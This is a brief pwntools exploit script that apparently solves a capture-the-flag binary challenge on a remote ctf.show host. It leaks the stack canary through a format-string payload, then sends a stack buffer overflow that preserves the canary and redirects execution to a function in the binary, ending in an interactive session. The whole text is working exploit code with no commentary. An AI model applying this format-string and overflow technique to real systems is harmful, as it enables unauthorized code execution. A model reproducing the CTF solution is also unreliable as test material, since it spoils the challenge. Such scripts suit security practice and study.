from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28206)
elf = ELF('./pwn')
shell = elf.sym['__stack_check']
io.recv()
payload = "%15$x"
io.sendline(payload)
canary = int(io.recv(),16)
log.info("Canary : 0x%x" % canary)
payload = cyclic(0x28) + p32(canary) + 'A'*0xC + p32(shell)
io.sendline(payload)
io.interactive()
